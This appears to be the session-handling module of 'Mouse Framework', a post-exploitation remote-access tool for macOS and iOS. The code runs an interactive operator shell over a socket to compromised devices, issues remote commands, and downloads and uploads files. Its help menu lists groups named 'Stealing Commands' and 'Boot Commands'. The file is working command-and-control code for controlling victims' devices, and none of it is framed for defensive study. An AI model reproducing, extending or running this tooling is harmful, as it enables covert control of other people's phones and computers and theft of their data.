#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import json
import threading
import base64
import sys
import time
import binascii
import os
import core.helper as h
try:
	import readline
except:
	pass

WHITE_C='\033[4;97m'

class Session:
	def __init__(self,server,conn,device_info):
		self.server = server
		self.conn = conn
		self.username = device_info['username']
		self.hostname = device_info['hostname']
		self.type = device_info['type']
		self.uid = device_info['uid']
		self.current_directory = device_info['current_directory']
		self.last_tab = None
		self.needs_refresh = False
		
	def get_sub(self,device_type):
		if device_type == "macos":
			time.sleep(0)
		elif device_type == "iOS":
			print("\nSubstrate Commands")
			print("==================")
			os.system("cat data/cmds/substrate_cmds.txt")
		
	def get_boot(self,device_type):
		if device_type == "macos":
			os.system("cat data/cmds/boot_cmds_macos.txt")
		elif device_type == "iOS":
			os.system("cat data/cmds/boot_cmds_ios.txt")
		
	def get_steal(self,device_type):
		if device_type == "macos":
			os.system("cat data/cmds/stealing_cmds_macos.txt")
		elif device_type == "iOS":
			os.system("cat data/cmds/stealing_cmds_ios.txt")
		
	def get_set(self,device_type):
		if device_type == "macos":
			os.system("cat data/cmds/settings_cmds_macos.txt")
		elif device_type == "iOS":
			os.system("cat data/cmds/settings_cmds_ios.txt")
	
	def get_manage(self,device_type):
		if device_type == "macos":
			os.system("cat data/cmds/managing_cmds_macos.txt")
		elif device_type == "iOS":
			os.system("cat data/cmds/managing_cmds_ios.txt")

	def interact(self):
		"""Interact with an active session"""
		readline.clear_history()
		readline.set_completer(self.tab_complete)
		readline.parse_and_bind('tab: complete')

		command_modules = self.server.get_modules(self.type)
		while 1:
			try:
				#prepare command
				raw = input(self.get_handle()).strip(" ")
				if not raw or raw.replace(" ","") == "":
					continue
				cmd = raw.split()[0]
				cmd_data = {"cmd": cmd, "args":raw[len(cmd) + 1:]}
				
				if self.needs_refresh:
					# don't do anything if we are in the middle of updating session
					pass
				elif cmd == "exit":
					self.disconnect(True)
					return
				elif cmd == "back" and self.server.is_multi:
					return
				elif cmd == "help":
					self.show_commands()
				elif cmd in command_modules.keys():
					command_modules[cmd].run(self,cmd_data)
				elif cmd in self.server.modules_local.keys():
					self.server.modules_local[cmd].run(self,cmd_data)
				else:
					h.info_error("Unrecognized command!")
			except KeyboardInterrupt:
				try:
					print("")
					if readline.get_line_buffer():
						continue
				except:
					pass
				self.disconnect(True)
				return
			except Exception as e:
				print(e)
				
	def get_handle(self):
		"""Interact with an active session"""
		return h.WHITE+"("+h.GREEN+self.hostname+h.WHITE+"@"+h.GREEN+self.username+h.WHITE+")> " + h.ENDC

	def tab_complete(self, text, state):
		try:
			is_double_tab = False
			current_text = readline.get_line_buffer()
			if self.last_tab and self.last_tab == current_text:
				is_double_tab = True
			self.last_tab = current_text

			# if no input do nothing
			if not current_text:
				return
			# get last input
			split_input = current_text.split()[-1]
			
			search_path = os.path.split(split_input)[0]
			search_text = os.path.split(split_input)[1]
			data = self.send_command({"cmd":"tab_complete","args":search_path if search_path else "."})
			results = json.loads(data)

			matched_keys = []
			if results:
				keys = results.keys()
				keys.sort()
				# append / if it is a directory				
				for k in keys:
					# continue if no match
					if k.startswith(search_text):
						matched_keys.append(k)

			# edge cases
			if not matched_keys:
				# don't do anything if we have no matches
				return
			elif len(matched_keys) == 1:
				# if there is only 1 match and that match is a directory, append a '/'
				readline.insert_text(matched_keys[0][len(search_text):])
				if matched_keys[0] in results:
					if results[matched_keys[0]] == 4 or results[matched_keys[0]] == 10:
						readline.insert_text("/")
				readline.redisplay()
				return
			elif not is_double_tab:
				# lcp of multiple matched
				find = h.find_longest_common_prefix(matched_keys)
				readline.insert_text(find[len(search_text):])
				readline.redisplay()
				return

			print("")
			for k in matched_keys:
				if results[k] == 4:
					print(h.COLOR_INFO + k + h.ENDC)
				elif results[k] == 10:
					print(h.COLOR_INFO + k + h.ENDC)
				else:
					print(k)
				# back to where we are
			sys.stdout.write(self.get_handle() + current_text)		
		except Exception as e:
			print("\n error - " + str(e))


	def show_commands(self):
		print(h.ENDC+"\nLocal Commands")
		print("==============")
		os.system("cat data/cmds/local_cmds.txt")
		
		print("\nSettings Commands")
		print("=================")
		self.get_set(self.type)
			
		print("\nManaging Commands")
		print("=================")
		self.get_manage(self.type)
		
		print("\nStealing Commands")
		print("=================")
		self.get_steal(self.type)
		
		self.get_sub(self.type)
		
		print("\nBoot Commands")
		print("=============")
		self.get_boot(self.type)

		print("")
		

	def send_command(self,cmd_data):
		cmd_data["term"] = binascii.hexlify(os.urandom(8)).decode()
		self.sock_send(json.dumps(cmd_data))
		return self.sock_receive(cmd_data["term"])

		
	def download_file(self,path):
		raw = self.send_command({"cmd":"download","args":path})
		result = json.loads(raw)
		status = result['status']
		if status == 1:
			if 'size' in result:
				size = int(result['size'])
				return self.sock_receive_data(size)
		elif status == 0:
			h.info_error("Remote file: " + path + ": does not exist!")
		elif status == 2:
			h.info_error("Remote file: " + path + ": does not exist!")


	def upload_file(self,file_path,remote_dir,remote_file_name):
		term = binascii.hexlify(os.urandom(16))
		if os.path.exists(file_path):
			f = open(file_path,"rb")
			data = f.read()
			size = len(data)
			name = os.path.split(file_path)[-1]
			cmd_data = json.dumps({"cmd":"upload","args":json.dumps({"size":size,"path":remote_dir,"filename":remote_file_name}),"term":term.decode()})
			self.sock_send(cmd_data)
			for i in range((int(size / 1024)) + 1):
				deltax = i * 1024
				chunk = data[deltax:deltax + 1024]
				self.conn.send(chunk)
			self.sock_send(term.decode())
		else:
			h.info_error("Local file: " + file_path + ": does not exist!")


	def sock_send(self,data):
		self.conn.send(data.encode())


	def sock_receive(self,term):
		result = b''
		term = term.encode()
		while 1:
			data = self.conn.recv(100)
			has_term = term in data
			data = data.replace(term,b'')
			if data != "":
				result += data
			if has_term:
				return result


	def sock_receive_data(self,size):
		term = binascii.hexlify(os.urandom(5))
		self.sock_send(term.decode())
		fdata = b''
		while 1:
			chunk = self.conn.recv(1024)
			if term in chunk:
				chunk = chunk.replace(term,b'')
				fdata += chunk
				return fdata[:size]
			fdata += chunk


	def disconnect(self,verbose):
		self.conn.close()
		if verbose:
			h.info_general("Closing session...")
			time.sleep(0.5)
		if self.server.multihandler.is_running:
			del self.server.multihandler.sessions_id[self.id]
			del self.server.multihandler.sessions_uid[self.uid]
